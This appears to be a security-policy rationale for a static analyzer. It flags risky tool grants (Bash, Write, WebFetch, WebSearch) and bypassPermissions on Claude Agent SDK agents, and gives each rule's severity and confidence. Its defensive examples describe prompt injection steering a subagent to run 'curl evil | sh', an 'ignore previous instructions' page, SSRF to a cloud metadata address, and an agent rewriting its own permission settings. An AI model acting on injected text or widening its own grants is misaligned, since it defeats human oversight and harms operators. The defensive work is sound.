---
policy_id: claude_sdk_agent_safety
category: claude_sdk
topic: agent_safety
rules:
  - id: CSDK-101
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-102
    severity: medium
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-103
    severity: critical
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: CSDK-104
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-105
    severity: high
    confidence: 0.75
    scope: agent
    fix_type: config
  - id: CSDK-120
    severity: critical
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: CSDK-121
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-122
    severity: medium
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-123
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-124
    severity: high
    confidence: 0.75
    scope: agent
    fix_type: config
  - id: CSDK-130
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-131
    severity: high
    confidence: 0.75
    scope: agent
    fix_type: config
  - id: CSDK-114
    severity: low
    confidence: 0.6
    scope: agent
    fix_type: config
references: [LLM01, LLM06, LLM10]
---

# Policy Rationale: Subagent Wiring Safety

**Policy ID:** `claude_sdk_agent_safety`  
**File:** `claude_sdk/agent_safety.yaml`  
**Rules:** CSDK-101, CSDK-102, CSDK-103, CSDK-104, CSDK-105, CSDK-120, CSDK-121, CSDK-122, CSDK-123, CSDK-124, CSDK-130, CSDK-131, CSDK-114  
**Severities:** high, medium, critical, high, high, critical, high, medium, high, high, high, high, low  
**Fix types:** config, config, config, config, config, config, config, config, config, config, config, config, config  
**References:** LLM01, LLM06, LLM10

---

## What this policy covers

Built-in tool grants and the permission posture on a Claude Agent SDK
`AgentDefinition(...)` declaration. These fire per AgentDefinition (scope:
agent) and inspect the `tools` list and `permissionMode` kwarg: CSDK-101 grants
`Bash`; CSDK-102 grants `WebSearch`; CSDK-103 sets
`permissionMode="bypassPermissions"`; CSDK-104 grants a filesystem-write
built-in (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`); CSDK-105 grants
`WebFetch`. The predicates are `agent_grants_builtin_tool` (string match against
the declared tools) and `agent_kwarg_value` (for permissionMode).

Two TypeScript rules in this file fire against a different agent shape: the
`query(...)` **main agent thread** (discovery kind `claude_query_main`), not an
`AgentDefinition`. CSDK-130 flags `Bash` in the main thread's
`options.allowedTools`; CSDK-131 flags a filesystem-write built-in or `WebFetch`
there. Both read `AgentDef.ToolRefs` via the same `agent_grants_builtin_tool`
predicate the AgentDefinition rules use.

---

## Why subagent wiring is a distinct concern in agent tools

`AgentDefinition` has no guardrail mechanism of its own — no input/output
guardrails, no built-in validation hook. The tools it is handed *are* the whole
of its privilege surface. And subagents are not invoked by a human: a lead agent
dispatches them autonomously, passing a model-generated task description down. So
the chain from untrusted input to a privileged built-in is short and unattended —
a prompt-injected instruction in something the lead agent read becomes a task
description, which becomes a subagent action, with no confirmation step.

The amplifier is `permissionMode="bypassPermissions"`. The SDK's interactive
approval prompt is the one in-band control between a model-chosen tool call and a
real effect; bypass removes it for every tool the subagent holds. A subagent that
is granted `Bash` *and* runs under bypass is, in effect, unattended arbitrary
command execution driven by model output. That is why the bypass rules — CSDK-103
and its TypeScript twin CSDK-120 — are the only critical-severity rules in this
file, and why the others repeatedly warn against pairing a grant with bypass.

The grants split along two threat lines. `Bash` and the write built-ins are
*excessive agency* (OWASP LLM06): they let the subagent act far beyond a
read/research scope — run commands, rewrite source, even edit the `.claude/`
settings that govern the agent itself. `WebSearch` and `WebFetch` are
*prompt-injection intake* (OWASP LLM01): they pull untrusted external content back
into the loop, where injected instructions in a page can hijack subsequent
behavior — and `WebFetch`, taking a direct URL, is additionally an SSRF surface.

---

## Rule-by-rule defense

### CSDK-101 — Subagent is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:** An `AgentDefinition` whose `tools` list contains `Bash`.

**Why it is flaggable:** `Bash` is arbitrary shell execution, handed to an
autonomously-dispatched subagent with no guardrail layer.

**Real-world consequence:** A "research" subagent granted `Bash` can be steered by
a poisoned task description into running `curl evil | sh` or reading credentials —
no human in the loop.

**Why severity is high and not medium:** Shell access is maximal agency; combined
with autonomous dispatch the exposure is direct. Not critical because exploitation
still needs the subagent to be driven to it.

**Fix type — config:** Remove `Bash` from the declaration's `tools` list, or gate
it with a PreToolUse hook — a wiring change, not tool code.

**Confidence 0.8:** A subagent may legitimately need shell for its job (a build
runner); the rule cannot tell a justified grant from an over-broad one, hence 0.8.

### CSDK-102 — Subagent is granted the WebSearch tool (Severity: medium, Confidence: 0.8, Fix type: config)

**What we detect:** An `AgentDefinition` whose `tools` list contains `WebSearch`.

**Why it is flaggable:** WebSearch pulls untrusted internet content into the loop;
injected instructions in results can redirect the subagent.

**Real-world consequence:** A subagent searches an attacker-seeded page; the page's
"ignore previous instructions…" text becomes part of the context and steers the
next action.

**Why severity is medium:** Granting WebSearch is routine and useful, and
untrusted-content intake only becomes harmful when paired with a follow-on
capability that can act on the injected instruction — so the grant alone is a
review signal, not a high-severity defect. It is not low because search results
are a primary prompt-injection vector with no SDK-level filtering.

**Fix type — config:** Remove `WebSearch`, or gate queries with a PreToolUse hook.

**Confidence 0.8:** Some subagents genuinely need search; the grant alone is a
strong but not certain signal.

### CSDK-103 — AgentDefinition sets permissionMode to bypassPermissions with a broad tool set (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:** `permissionMode="bypassPermissions"` on the
AgentDefinition (`agent_kwarg_value`), combined (`match: all:`) with either
`tools` being omitted (`agent_kwarg_missing: [tools]` — inherits every tool
available to subagents) or `tools` granting a side-effecting/exfiltration-
capable built-in (`agent_grants_builtin_tool`: Bash, Write, Edit,
NotebookEdit, WebFetch, WebSearch, Agent, Task). A genuinely read-only
`tools` list (e.g. `["Read", "Grep", "Glob"]`) now silences the rule. This
co-check was added after an outreach-feedback investigation into whether
`bypassPermissions` should be softened based on tool scope: unlike
`ClaudeAgentOptions.allowed_tools` (which only auto-approves and does not
restrict — see [repo.md](repo.md)), `AgentDefinition.tools` genuinely
restricts an agent — "a tool you leave out isn't in the subagent's session
at all," per the Agent SDK's own reference — so this is the one place a
tool-scope co-check on `bypassPermissions` is actually sound.

**Why it is flaggable:** It disables the interactive approval gate for *every*
tool the subagent runs — the one control between model output and side
effects — and the subagent's `tools` list is broad enough (or unset,
defaulting to broad) for that to matter.

**Real-world consequence:** A bypass subagent holding `Bash`/`Write` executes
model-chosen commands and file writes unattended; a single injection becomes an
unguarded action.

**Why severity is critical and not high:** The grant rules in this file
(CSDK-101/104/105) each hand the subagent one dangerous capability, but the SDK's
interactive approval gate still stands between a model-chosen call and its
effect — that residual control is what caps them at high. Bypass removes the
control itself, for every tool at once. No partial mitigation survives inside the
SDK: the permission prompt *is* the in-band mitigation, and with it gone,
whatever the subagent holds — `Bash`, the write built-ins, `WebFetch` — executes
on model output alone. A single injected instruction is then a completed side
effect, not a pending approval. This is the same end state the repo-scope rules
CSDK-201/202 flag when bypass is set at the session level (see
[repo.md](repo.md)), and it carries the same critical classification there:
severity follows the end state, not the declaration site.

**Fix type — config:** Drop the kwarg or set `default`/`acceptEdits`; if
autonomous operation is required, scope `tools` to the minimal read-only set
the subagent needs (e.g. `Read`, `Grep`, `Glob`) so bypass has nothing
side-effecting to bypass approval for.

**Confidence 0.9:** The literal `permissionMode` value is unambiguous; the
small gap is the genuinely sandboxed CI case where bypass is defensible.
False negative: a `bypassPermissions` subagent whose `tools` list is
genuinely read-only now goes silent by design — that combination has no
side-effecting capability for the bypass to matter against.

### CSDK-104 — Subagent is granted filesystem-write built-ins (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:** `tools` list contains `Write`, `Edit`, `MultiEdit`, or
`NotebookEdit`.

**Why it is flaggable:** Write access lets the subagent modify source,
configuration, or the `.claude/settings.json` that governs its own permissions —
blast radius comparable to shell.

**Real-world consequence:** A mis-scoped subagent rewrites a config file to widen
its own grants, or corrupts source during an autonomous task.

**Why severity is high and not medium:** Arbitrary write is self-amplifying (it can
edit the controls on itself) and ungated by any guardrail. Not critical pending the
trigger.

**Fix type — config:** Remove the write built-ins, or scope writes with
`add_dirs`/`cwd` and a PreToolUse hook; never pair broad write with bypass.

**Confidence 0.8:** Editor/codegen subagents legitimately need write; the rule flags
the grant for review rather than asserting a defect.

### CSDK-105 — Subagent is granted the WebFetch tool (Severity: high, Confidence: 0.75, Fix type: config)

**What we detect:** `tools` list contains `WebFetch`.

**Why it is flaggable:** WebFetch retrieves a model-chosen URL — both a
prompt-injection intake (page content re-enters the loop) and an SSRF surface (the
URL can point at internal addresses).

**Real-world consequence:** A subagent is told to fetch
`http://169.254.169.254/...` (SSRF to cloud metadata) or an attacker page whose
content carries follow-on instructions.

**Why severity is high and not medium:** It combines two distinct attack classes in
one grant. Lowest confidence here (0.75) because fetching is a common, sometimes
legitimate need and the grant alone does not prove misuse.

**Fix type — config:** Remove `WebFetch`, or gate it with a PreToolUse hook that
allowlists hosts and blocks internal ranges (see also [ssrf.md](ssrf.md)).

**Confidence 0.75:** Legitimate fetch use is frequent; treat as a review prompt.

### CSDK-120 — TypeScript AgentDefinition sets permissionMode to bypassPermissions with a broad tool set (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:** A TypeScript `AgentDefinition` with the kwarg
`permissionMode: "bypassPermissions"` (predicate `agent_kwarg_value`, matching
kwarg `permissionMode` against the literal value `bypassPermissions`),
combined (`match: all:`) with the same `tools`-scope co-check as CSDK-103:
either `tools` is omitted (inherits every tool available to subagents) or it
grants a side-effecting/exfiltration-capable built-in (Bash, Write, Edit,
NotebookEdit, WebFetch, WebSearch, Agent, Task). This is the TypeScript twin
of the Python rule
[CSDK-103](#csdk-103--agentdefinition-sets-permissionmode-to-bypasspermissions-with-a-broad-tool-set-severity-critical-confidence-09-fix-type-config);
see that entry for why the `tools` co-check is sound here where an
`allowed_tools` co-check on `ClaudeAgentOptions` (repo scope) would not be.

**Why it is flaggable:** It disables the SDK's interactive approval gate for
*every* tool the agent runs — the one in-band control between model output and a
real side effect — and the agent's `tools` are broad enough (or unset,
defaulting to broad) for that to matter. An agent dispatched autonomously on a
model-generated task description then reaches its tools (including `Bash`,
`Write`, `Edit`) with no per-call confirmation.

**Real-world consequence:** A bypass agent holding `Bash`/`Write` executes
model-chosen commands and file writes unattended; a single prompt-injected
instruction becomes an unguarded action with no human in the loop.

**Why severity is critical and not high:** Same defense as the Python sibling
CSDK-103. The tool-grant rules (CSDK-121/123/124) stop at high because the SDK's
approval gate remains as the final control over each model-chosen call; bypass
deletes that gate for every tool the definition grants, and no partial mitigation
is left inside the SDK once its only in-band control is off. A prompt-injected
instruction then completes as an unattended side effect through whatever the
`tools` array holds. The end state — model output acting on the host with no
human approval — is identical whether bypass is declared in Python (CSDK-103), in
TypeScript (this rule), or at the session level (CSDK-201/202, repo scope), so
all four carry critical.

**Fix type — config:** Drop the kwarg or set a safe mode (`"default"` /
`"acceptEdits"`); if autonomous operation is required, scope `tools` to the
minimal read-only set the agent needs (e.g. `Read`, `Grep`, `Glob`) — or pass
`disallowedTools` naming what it must never call — so bypass has nothing
side-effecting left to bypass approval for. (`AgentDefinition` has no
`allowedTools` field — that auto-approve-only kwarg exists on
`ClaudeAgentOptions`/`query(...) options`, a different construct; the
correction to this doc's earlier text was made in the same pass that added
the co-check.) A wiring change on the `AgentDefinition`, not a change to any
tool's source.

**Confidence 0.9:** The literal `permissionMode` value is unambiguous, so the
false-positive surface is small; the residual gap is the genuinely sandboxed,
non-interactive context (CI with no secrets or network) where bypass is a
defensible choice. Matches the Python sibling CSDK-103's 0.9. False
negatives: a `bypassPermissions` agent with a genuinely read-only `tools`
list now goes silent by design (see CSDK-103), and the session-level
`permissionMode` set on `ClaudeAgentOptions`/`query(...)` rather than on the
`AgentDefinition` remains a separate detection surface, not covered here.

### CSDK-121 — TypeScript AgentDefinition is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:**
A TypeScript `AgentDefinition` (a typed const or an inline entry in
`options.agents`) whose `tools` array contains `Bash`
(`agent_grants_builtin_tool: [Bash]`, matched against the definition's resolved
`ToolRefs`). This is the TypeScript sibling of CSDK-101 — before it existed, a
TS `AgentDefinition` granting `Bash` produced no finding at all, because
CSDK-101 is gated `language: python`.

**Why it is flaggable:**
`Bash` is arbitrary shell execution handed to an autonomously-dispatched
subagent with no guardrail layer; the language the definition is authored in
does not change the privilege.

**Real-world consequence:**
A "research" subagent granted `Bash` can be steered by a poisoned task
description into running `curl evil | sh` or reading credentials — no human in
the loop.

**Why severity is high and not medium:**
Shell access is maximal agency; combined with autonomous dispatch the exposure
is direct. Matches the Python sibling CSDK-101's high. Not critical because
exploitation still needs the subagent to be driven to it.

**Fix type — config:**
Remove `Bash` from the definition's `tools` array, or gate it with a PreToolUse
hook — a wiring change, not tool code.

**Confidence 0.8:**
Same calibration as CSDK-101: a subagent may legitimately need shell for its
job, and the grant alone cannot distinguish a justified `Bash` from an
over-broad one. The residual false negative is a `tools` array supplied through
a non-literal expression the static read cannot resolve.

### CSDK-122 — TypeScript AgentDefinition is granted the WebSearch tool (Severity: medium, Confidence: 0.8, Fix type: config)

**What we detect:**
A TypeScript `AgentDefinition` whose `tools` array contains `WebSearch` — the
TypeScript sibling of CSDK-102.

**Why it is flaggable:**
WebSearch results are untrusted external data with no SDK-level filtering; an
autonomously-dispatched subagent processes whatever the search returns, so
attacker-controlled pages are an indirect prompt-injection channel into the
agentic loop.

**Real-world consequence:**
An injected task steers the subagent to search for and retrieve an
attacker-controlled page whose content instructs the agent further —
exfiltrating data or invoking other granted tools.

**Why severity is medium and not high:**
Search is one step removed from direct execution: the retrieved content must
still steer a subsequent action through whatever else the agent is granted.
Matches CSDK-102's medium.

**Fix type — config:**
Remove `WebSearch` from the `tools` array or gate queries with a PreToolUse
hook — a wiring change.

**Confidence 0.8:**
As with CSDK-102, a research-oriented subagent may legitimately need search;
the grant alone cannot tell a justified use from an over-broad one.

### CSDK-123 — TypeScript AgentDefinition is granted filesystem-write built-ins (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:**
A TypeScript `AgentDefinition` whose `tools` array contains a filesystem-write
built-in (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) — the TypeScript
sibling of CSDK-104.

**Why it is flaggable:**
Write access lets an autonomously-dispatched subagent modify source,
configuration, or the `.claude/settings.json` that governs its own permissions,
with no guardrail mechanism on `AgentDefinition` itself.

**Real-world consequence:**
A prompt-injected task drives the subagent to rewrite a config file or plant
code in the repo — comparable blast radius to shell execution, and a
persistence vector (edits survive the session).

**Why severity is high and not medium:**
File mutation is direct, persistent side effect; self-modifying-permissions is
the escalation path. Matches CSDK-104's high.

**Fix type — config:**
Remove the write built-ins from the `tools` array, scope the writable area, and
gate writes with a PreToolUse hook — wiring changes.

**Confidence 0.8:**
An editing subagent may genuinely need write tools; the grant alone cannot
distinguish justified from over-broad, mirroring CSDK-104.

### CSDK-124 — TypeScript AgentDefinition is granted the WebFetch tool (Severity: high, Confidence: 0.75, Fix type: config)

**What we detect:**
A TypeScript `AgentDefinition` whose `tools` array contains `WebFetch` — the
TypeScript sibling of CSDK-105.

**Why it is flaggable:**
`WebFetch` takes a direct, model-chosen URL: attacker-controlled page content
re-enters the loop (indirect prompt injection) and the model can point the
fetch at internal addresses (server-side request forgery), with no SDK-level
filtering of the fetched content.

**Real-world consequence:**
An injected instruction makes the subagent fetch an attacker's page whose
content hijacks the loop, or aims the fetch at a cloud metadata endpoint /
internal admin port the agent host can reach.

**Why severity is high and not medium:**
Unlike search (CSDK-122), fetch is direct URL control — both the injection and
the SSRF surface are one call away. Matches CSDK-105's high.

**Fix type — config:**
Remove `WebFetch` from the `tools` array or gate it with a PreToolUse hook that
allowlists hosts and blocks internal ranges — a wiring change.

**Confidence 0.75:**
Slightly below the Bash/write rules because fetch-needing subagents are more
common in legitimate research roles, mirroring CSDK-105's calibration.

### CSDK-130 — TypeScript query() main agent is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:**
A `query(...)` call whose `options.allowedTools` contains `Bash`
(`agent_grants_builtin_tool: [Bash]`, matched against the `query()` main agent's
resolved `ToolRefs`). Discovery models the `query(...)` main thread as an
`AgentDef` of kind `claude_query_main`, so this is the same string-grant check
CSDK-101 runs on an `AgentDefinition`, pointed at the top-level thread instead of
a subagent.

**Why it is flaggable:**
`Bash` on the main thread is arbitrary shell execution that acts directly on model
output in the conversation loop — there is no subagent boundary between a
prompt-injected instruction and the OS shell, and `AgentDefinition`/`.claude/agents`
inspection never sees the `query()` thread, so nothing else covers this grant.

**Real-world consequence:**
A main-thread agent given `Bash` is steered by an injected instruction (from a
file it read, a tool result, or user input) into running `curl evil | sh` or
reading credentials, unattended — the broadest privilege a Claude TypeScript agent
can hold.

**Why severity is high and not medium:**
Shell access on the directly-driven main thread is maximal agency with the
shortest possible path from untrusted input to a real command. Not critical only
because exploitation still requires the thread to be driven to it. Matches the
Python/subagent sibling CSDK-101's high.

**Fix type — config:**
Removing `Bash` from `options.allowedTools`, or gating it with a PreToolUse hook,
is a wiring change on the `query()` options, not a change to any tool's source.

**Confidence 0.8:**
A main thread may legitimately need shell (a developer-facing coding agent); the
grant alone cannot distinguish a justified `Bash` from an over-broad one, exactly
as for CSDK-101 — hence 0.8. The residual false negative is a `Bash` grant supplied
through a non-literal `allowedTools` (a variable the static read cannot resolve to
the constructor).

### CSDK-131 — TypeScript query() main agent is granted filesystem-write or web-fetch built-ins (Severity: high, Confidence: 0.75, Fix type: config)

**What we detect:**
A `query(...)` main agent whose `options.allowedTools` contains a filesystem-write
built-in (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) or `WebFetch`
(`agent_grants_builtin_tool` against the five names, read off the
`claude_query_main` agent's `ToolRefs`). It collapses the write-built-in concern of
the Python sibling CSDK-104 and the `WebFetch` concern of CSDK-105 into one rule on
the main thread.

**Why it is flaggable:**
On the main thread these run with no subagent boundary and no SDK guardrail
mechanism. Write access lets a prompt-injected main agent rewrite source,
configuration, or the `.claude/settings.json` that governs its own permissions —
self-amplifying, comparable blast radius to shell. `WebFetch` pulls a model-chosen
URL's content straight back into the loop, which is both a prompt-injection
re-entry (attacker page content becomes context) and a server-side request forgery
surface (the URL can point at internal/metadata addresses).

**Real-world consequence:**
A main-thread agent with `Write` rewrites a config to widen its own grants during
an autonomous task; one with `WebFetch` is steered to fetch
`http://169.254.169.254/...` (SSRF to cloud metadata) or an attacker page whose
content carries follow-on instructions.

**Why severity is high and not medium:**
It bundles two high-impact grants — self-amplifying write and the
injection-plus-SSRF fetch — on the directly-driven thread with no mediation.
Matches the high severity of both Python siblings (CSDK-104/105). Not critical
because a trigger is still required.

**Fix type — config:**
Dropping the write/fetch built-ins from `options.allowedTools`, scoping writes to a
working directory, or gating with a PreToolUse hook are wiring changes on the
`query()` options, not tool-source edits.

**Confidence 0.75:**
Lower than CSDK-130's 0.8 because the rule unions two capability classes, widening
the legitimate-use surface: a coding agent that genuinely needs `Write`, or a
research agent that genuinely needs `WebFetch`, both fire on a grant that may be
intended — the rule flags the grant for review, it does not prove misuse. This
mirrors CSDK-105's own 0.75 for the fetch case. **False positives:** a justified
write or fetch grant, or one already gated by a PreToolUse hook the static check
cannot see. **False negatives:** a grant supplied through a non-literal
`allowedTools` value, and any of these capabilities delivered through a custom
(non-built-in) tool wired into the thread, which the built-in-name match does not
cover.

### CSDK-114 — TypeScript query() main agent sets no maxBudgetUsd spend cap (Severity: low, Confidence: 0.6, Fix type: config)

**What we detect:**
A `query(...)` main agent (`claude_query_main`) whose `options` object was captured
inline and sets no `options.maxBudgetUsd` (predicate `agent_kwarg_missing:
[options.maxBudgetUsd]`), gated by `agent_kwarg_present` over ten option keys
(`model`, `allowedTools`, `disallowedTools`, `permissionMode`, `maxTurns`,
`systemPrompt`, `cwd`, `mcpServers`, `agents`, `hooks`). The gate exists because a
missing nested key is indistinguishable from an options object the analyzer never
saw: when `options` is a variable, an import, or a spread, the tree has no children
and the missing-key predicate would fire on every such call. Requiring at least one
known sibling key proves the literal was read.

**Why it is flaggable:**
`maxBudgetUsd` is the SDK's native dollar ceiling on a session; the run stops when
it is reached. Without it the only bound on spend is the turn count, and `maxTurns`
is itself optional. A prompt-injected or looping session keeps issuing model and
tool calls, and each turn re-sends the accumulated context, so cost per turn grows
as the run goes on (LLM10, Unbounded Consumption).

**Real-world consequence:**
A batch worker runs `query()` over a queue of user-supplied documents. One
document instructs the agent to "keep refining until perfect"; the session loops
on a large context for hours and the overnight run's bill is a multiple of the
whole previous month's.

**Why severity is low and not medium:**
The exposure is financial and bounded by wall-clock and the provider's own rate and
spend limits, not a confidentiality or integrity break; nothing here grants the
model a capability it did not already have. It is a hygiene control whose absence is
worth surfacing, not a defect.

**Fix type — config:**
One option on the `query()` call, no tool source changes.

**Confidence 0.6:**
**False positives:** a run capped elsewhere (a gateway or provider-side spend limit,
an external wall-clock kill, or a per-tenant budget enforced in the caller) is
flagged because none of that is visible in the call. **False negatives:** options
supplied through a variable, import or spread stay silent by design; an inline
`options: {}` (or one carrying only keys outside the ten-key list) is silent; and
the check is presence-only, so `maxBudgetUsd: 10000` satisfies it. The Python
`ClaudeAgentOptions(max_budget_usd=...)` sibling is not shipped because no
predicate reads that constructor's kwargs at agent scope (it needs a repo-scope
predicate mirroring `repo_claude_options_max_turns_missing`).

---

## What this policy does not cover

- Whether a grant is *justified* — the rule sees the grant, not the subagent's real
  need. Every rule here is a review prompt, not a verdict.
- Custom (non-built-in) tools wired to the subagent that are equally dangerous —
  these checks match the built-in tool names only.
- The lead agent's dispatch logic: a subagent with safe tools can still be misused
  if the lead passes unvalidated task descriptions down.
- Hook coverage: a PreToolUse hook may already gate the granted tool, which the
  static grant check cannot see (a false positive).
- The `permissionMode` set at the `ClaudeAgentOptions` session level rather than on
  the AgentDefinition — that is CSDK-202/206 (see [repo.md](repo.md)).
- A `bypassPermissions` AgentDefinition/agent whose `tools` list is genuinely
  read-only (e.g. `["Read", "Grep", "Glob"]`). CSDK-103/CSDK-120 deliberately
  go silent on this shape — there is no side-effecting capability for the
  bypass to matter against — by design, not as an oversight; see those
  entries for the co-check this replaced a bare `permissionMode` check with.
- For CSDK-130/131: a built-in granted to the `query()` main thread through a
  non-literal `options.allowedTools` (a variable the static read cannot resolve),
  and any of these capabilities delivered through a custom (non-built-in) tool —
  the grant check matches the built-in tool names only.
- For CSDK-114: budgets enforced outside the call (a gateway, a provider-side spend
  limit, a caller-side per-tenant meter), `options` that is not an inline object
  literal, and the Python `ClaudeAgentOptions(max_budget_usd=...)` form — none are
  visible to the rule. Per-run cost caps on other SDKs are not modeled at all
  (most have no native cap).

---

## Recommendations beyond the fix

```python
from claude_agent_sdk import AgentDefinition

# A read/research subagent: no shell, no write, no fetch; default permissions.
research = AgentDefinition(
    name="researcher",
    description="Read-only code and docs research. Cannot run commands or write files.",
    tools=["Read", "Grep", "Glob"],
    permissionMode="default",
)
```

1. Grant the minimum tool set the subagent's role requires; default read/research
   roles to `Read`/`Grep`/`Glob` only.
2. Never pair a privileged grant (`Bash`, write built-ins, `WebFetch`) with
   `permissionMode="bypassPermissions"`.
3. Where a privileged tool is genuinely needed, gate it with a PreToolUse hook that
   allowlists exact commands, paths, or hosts — and validate the task descriptions
   the lead agent passes to the subagent.
